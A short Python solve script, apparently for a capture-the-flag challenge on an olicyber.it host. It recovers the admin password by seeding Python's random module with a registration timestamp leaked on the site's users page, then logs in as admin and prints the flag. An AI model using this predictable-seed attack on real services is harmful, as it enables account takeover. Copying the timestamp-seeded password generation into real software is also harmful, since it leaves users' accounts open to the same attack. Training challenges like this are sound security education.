import random,requests,string,time,re

s = requests.Session()

site = "http://privnotes.challs.olicyber.it"

s.post(site + "/register", data={"username":f"b{random.choices(string.ascii_lowercase, k=random.randint(10,20))}"})
r = s.get(site + "/users")
regdate = re.search(r'<time[^>]*>', r.text)
regdate = float(regdate.group().replace('<time raw="','').replace('">',''))
random.seed(regdate)
password = "".join(random.choices(string.ascii_letters + string.digits, k=16))
r = s.post(site+"/login", data={"username":"admin","password":f"{password}"}, allow_redirects=True)
flag = re.search(r'flag{.*\}',r.text).group()
print(flag)
